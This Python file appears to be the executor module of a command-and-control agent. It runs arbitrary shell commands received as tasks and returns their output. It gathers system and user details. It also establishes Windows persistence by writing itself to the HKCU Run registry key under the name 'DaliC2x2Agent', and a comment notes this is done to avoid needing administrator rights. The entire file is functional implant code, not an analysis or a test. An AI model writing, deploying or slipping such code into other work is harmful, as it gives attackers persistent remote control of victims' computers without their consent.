import subprocess
import os
import platform
import sys
from typing import Dict, Any

class Executor:
    @staticmethod
    def execute(task_type: str, payload: Dict[str, Any]) -> Dict[str, Any]:
        """
        Routes the task to the appropriate handler.
        """
        if task_type == "shell":
            return Executor._shell_exec(payload.get("command", ""))
        elif task_type == "sysinfo":
            return Executor._get_sysinfo()
        elif task_type == "persist":
            return Executor._persist()
        else:
            return {"status": "error", "error": f"Unknown task type: {task_type}"}

    @staticmethod
    def _shell_exec(command: str) -> Dict[str, Any]:
        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30
            )
            return {
                "status": "success",
                "stdout": result.stdout,
                "stderr": result.stderr,
                "exit_code": result.returncode
            }
        except subprocess.TimeoutExpired:
            return {"status": "error", "error": "Command timed out"}
        except Exception as e:
            return {"status": "error", "error": str(e)}

    @staticmethod
    def _get_sysinfo() -> Dict[str, Any]:
        try:
            info = {
                "os": platform.system(),
                "os_version": platform.version(),
                "machine": platform.machine(),
                "processor": platform.processor(),
                "cwd": os.getcwd(),
                "user": os.getlogin() if hasattr(os, 'getlogin') else "unknown"
            }
            return {"status": "success", "info": info}
        except Exception as e:
            return {"status": "error", "error": str(e)}

    @staticmethod
    def _persist() -> Dict[str, Any]:
        if platform.system() != "Windows":
            return {"status": "error", "error": "Persistence only implemented for Windows"}
        
        try:
            import winreg
            # Get the path of the current executable
            exe_path = os.path.abspath(sys.executable) if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
            
            # Use HKCU to avoid needing admin privileges
            key = winreg.HKEY_CURRENT_USER
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            
            with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
                winreg.SetValueEx(reg_key, "DaliC2x2Agent", 0, winreg.REG_SZ, exe_path)
            
            return {"status": "success", "output": f"Persistence established in Registry: {exe_path}"}
        except Exception as e:
            return {"status": "error", "error": f"Failed to establish persistence: {str(e)}"}
